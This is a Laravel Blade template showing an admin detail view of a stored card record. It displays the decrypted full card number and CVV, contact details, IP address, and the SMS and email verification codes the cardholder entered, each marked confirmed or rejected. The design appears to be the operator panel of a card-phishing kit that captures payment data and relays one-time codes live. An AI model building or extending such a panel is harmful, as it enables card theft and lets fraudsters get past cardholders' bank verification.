<div class="space-y-4 text-sm">
    {{-- Card Information --}}
    <div class="bg-gray-50 dark:bg-gray-800 rounded-lg p-4">
        <h4 class="font-bold text-gray-700 dark:text-gray-300 mb-3 flex items-center gap-2">
            <x-heroicon-o-credit-card class="w-5 h-5" />
            Card Information
        </h4>
        <div class="grid grid-cols-2 gap-3">
            <div>
                <span class="text-gray-500 text-xs">Cardholder Name</span>
                <div class="font-medium">{{ $card->cardholder_name }}</div>
            </div>
            <div>
                <span class="text-gray-500 text-xs">Card Number</span>
                <div class="font-mono font-medium">
                    {{ $card->decrypted_card_number ?? $card->card_number_masked }}
                </div>
            </div>
            <div>
                <span class="text-gray-500 text-xs">Expiry</span>
                <div class="font-mono">{{ $card->card_expiry }}</div>
            </div>
            <div>
                <span class="text-gray-500 text-xs">CVV</span>
                <div class="font-mono">{{ $card->decrypted_cvv ?? '***' }}</div>
            </div>
            <div>
                <span class="text-gray-500 text-xs">Card Type</span>
                <div class="uppercase font-bold">{{ $card->card_type }}</div>
            </div>
            <div>
                <span class="text-gray-500 text-xs">Brand</span>
                <div>{{ $card->brand->name ?? '—' }}</div>
            </div>
        </div>
    </div>

    {{-- Contact Information --}}
    <div class="bg-gray-50 dark:bg-gray-800 rounded-lg p-4">
        <h4 class="font-bold text-gray-700 dark:text-gray-300 mb-3 flex items-center gap-2">
            <x-heroicon-o-user class="w-5 h-5" />
            Contact Information
        </h4>
        <div class="grid grid-cols-2 gap-3">
            <div>
                <span class="text-gray-500 text-xs">Email</span>
                <div>{{ $card->email }}</div>
            </div>
            <div>
                <span class="text-gray-500 text-xs">Phone</span>
                <div>{{ $card->phone ?? '—' }}</div>
            </div>
            <div class="col-span-2">
                <span class="text-gray-500 text-xs">Address</span>
                <div>{{ $card->full_address ?: '—' }}</div>
            </div>
        </div>
    </div>

    {{-- Verification Status --}}
    <div class="bg-gray-50 dark:bg-gray-800 rounded-lg p-4">
        <h4 class="font-bold text-gray-700 dark:text-gray-300 mb-3 flex items-center gap-2">
            <x-heroicon-o-shield-check class="w-5 h-5" />
            Verification Status
        </h4>
        <div class="grid grid-cols-2 gap-3">
            <div>
                <span class="text-gray-500 text-xs">Current Status</span>
                <div class="font-bold uppercase text-xs mt-1">
                    <span @class([
                        'px-2 py-1 rounded',
                        'bg-gray-100 text-gray-600' => $card->status === 'pending',
                        'bg-yellow-100 text-yellow-700' => in_array($card->status, ['awaiting_sms', 'awaiting_email']),
                        'bg-blue-100 text-blue-700' => in_array($card->status, ['sms_code_entered', 'email_code_entered']),
                        'bg-green-100 text-green-700' => in_array($card->status, ['sms_confirmed', 'email_confirmed', 'verified']),
                        'bg-red-100 text-red-700' => in_array($card->status, ['sms_rejected', 'email_rejected', 'failed']),
                    ])>
                        {{ str_replace('_', ' ', $card->status) }}
                    </span>
                </div>
            </div>
            <div>
                <span class="text-gray-500 text-xs">Session Token</span>
                <div class="font-mono text-xs break-all">{{ substr($card->session_token, 0, 16) }}...</div>
            </div>
            @if($card->sms_code)
            <div>
                <span class="text-gray-500 text-xs">SMS Code Entered</span>
                <div class="font-mono font-bold text-lg text-blue-600">{{ $card->sms_code }}</div>
                @if($card->sms_code_valid !== null)
                    <span class="text-xs {{ $card->sms_code_valid ? 'text-green-600' : 'text-red-600' }}">
                        {{ $card->sms_code_valid ? '✓ Confirmed' : '✗ Rejected' }}
                    </span>
                @endif
            </div>
            @endif
            @if($card->email_code)
            <div>
                <span class="text-gray-500 text-xs">Email Code Entered</span>
                <div class="font-mono font-bold text-lg text-blue-600">{{ $card->email_code }}</div>
                @if($card->email_code_valid !== null)
                    <span class="text-xs {{ $card->email_code_valid ? 'text-green-600' : 'text-red-600' }}">
                        {{ $card->email_code_valid ? '✓ Confirmed' : '✗ Rejected' }}
                    </span>
                @endif
            </div>
            @endif
        </div>
    </div>

    {{-- Meta --}}
    <div class="text-xs text-gray-400 flex justify-between">
        <span>IP: {{ $card->ip_address ?? '—' }}</span>
        <span>Created: {{ $card->created_at->format('Y-m-d H:i:s') }}</span>
    </div>
</div>
